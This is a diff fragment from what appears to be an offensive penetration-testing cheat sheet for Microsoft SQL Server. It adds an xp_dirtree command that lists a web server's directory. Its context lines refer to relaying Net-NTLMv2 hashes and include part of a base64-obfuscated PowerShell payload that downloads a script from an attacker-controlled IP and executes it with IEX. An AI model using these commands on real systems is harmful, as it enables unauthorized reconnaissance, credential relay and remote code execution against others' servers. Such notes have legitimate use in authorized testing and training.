@@ -83,6 +83,11 @@ To relay the Net-NTLMv2 hash that you obtained with the xp_dirtree command you c
 kALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAu
 ADEAMQA4AC4AOQA6ADgAMQAvAHIAdQBuAC4AcABzADEAJwApACAAfAAgAEkARQBYAA=='
 ```
+With `xp_dirtree`, you can also review local directories, here's an example:
+
+```
+> EXEc xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
+```
 
 **PRIVILEGE ESCALATION:**
 
